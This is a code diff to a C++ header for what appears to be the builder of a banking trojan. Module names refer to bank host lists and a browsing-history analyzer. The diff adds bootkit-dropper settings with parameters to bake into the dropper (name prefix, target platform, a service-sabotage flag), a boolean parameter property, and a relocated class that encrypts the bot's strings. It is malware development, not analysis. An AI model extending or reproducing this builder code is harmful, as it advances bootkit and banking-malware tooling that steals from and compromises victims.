@@ -56,6 +56,15 @@ PCHAR Module_SberHosts       = "Хосты Sber";
 PCHAR Module_RafaHosts       = "Хосты Rafa";
 PCHAR Module_CCHosts         = "Хосты CC";
 PCHAR Module_HistoryAnalyzer = "Анализатор истории навигации";
+PCHAR Module_BootkitDroper   = "Настройки дропера буткита";
+
+
+
+// Параметры для вшития в дропер буткита
+PCHAR Param_DroperNamePrefix = "__DROPER_NAME_PREFIX__";
+PCHAR Param_TargetPlatform   = "__TARGET_PLATFORM__";
+PCHAR Param_SVCFuckupEnabled = "__SVC_FUCKUP_ENABLED__";
+
 
 
 
@@ -175,7 +184,9 @@ private:
 	void __fastcall SetAsStrings(const UnicodeString &Value);
 	DWORD __fastcall GetAsLong();
 	void __fastcall SetAsLong(DWORD Value);
-    bool __fastcall GetActive();
+	bool __fastcall GetAsBool();
+	void __fastcall SetAsBool(bool Value);
+	bool __fastcall GetActive();
 
 	friend class TBotBuilder;
 	friend class TBotModule;
@@ -209,9 +220,10 @@ public:
 	__property bool Encrypted = {read = FEncrypted};
 	__property UnicodeString Title = {read = FTitle, write = FTitle};
 	__property UnicodeString AsStrings = {read = GetAsStrings, write = SetAsStrings};
-	__property DWORD AsLong = {read = GetAsLong, write = SetAsLong};
-	__property AnsiString AsAnsiString = {read = GetAsAnsiString, write = SetAsAnsiString};
+	__property DWORD         AsLong = {read = GetAsLong, write = SetAsLong};
+	__property AnsiString    AsAnsiString = {read = GetAsAnsiString, write = SetAsAnsiString};
 	__property UnicodeString AsUnicodeString = {read = GetAsUnicodeString, write = SetAsUnicodeString};
+	__property bool          AsBool = {read = GetAsBool, write = SetAsBool};
 
 };
 
@@ -269,6 +281,15 @@ public:
 	__property TBotParam* Params[int Index] = {read=GetParams};
 };
 
+//*************************************************************
+//   TBotStringsEncryptor  - Класс шифрования строк бота
+//*************************************************************
+class TBotStringsEncryptor : public TComponent
+{
+public:
+	__fastcall TBotStringsEncryptor(TComponent *Owner);
+	bool Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password);
+};
 
 
 //*************************************************************
@@ -280,15 +301,6 @@ public:
 	bool __fastcall virtual Execute(TBotModule *Module) = 0;
 };
 
-//*************************************************************
-//   TBotStringsEncryptor  - Класс шифрования строк бота
-//*************************************************************
-class TBotStringsEncryptor : public TComponent
-{
-public:
-	__fastcall TBotStringsEncryptor(TComponent *Owner);
-	bool Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password);
-};
 
 
 
